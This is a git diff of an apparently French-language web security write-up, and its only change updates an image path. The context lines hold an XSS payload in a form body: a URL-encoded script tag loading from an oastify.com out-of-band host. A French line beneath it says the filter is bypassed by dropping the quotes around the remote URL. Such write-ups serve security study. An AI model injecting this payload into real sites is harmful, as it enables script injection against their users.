@@ -298,7 +298,7 @@ Connection: close
 entry=%3Cscript+src%3D%22http%3A%2F%2F7z7mvt95gvlpro9vtdbb8mq4xv3lra.oastify.com%22%3E%3C%2Fscript%3E&blog=submit&entry_add=
 ```
 
-![](<../../../../../.gitbook/assets/image (7).png>)
+![](<../../../../../.gitbook/assets/image (7) (1).png>)
 
 Le contournement est assez simple ici puisqu'il suffit d'omettre les guillemets autour de l'URL distante :&#x20;
 
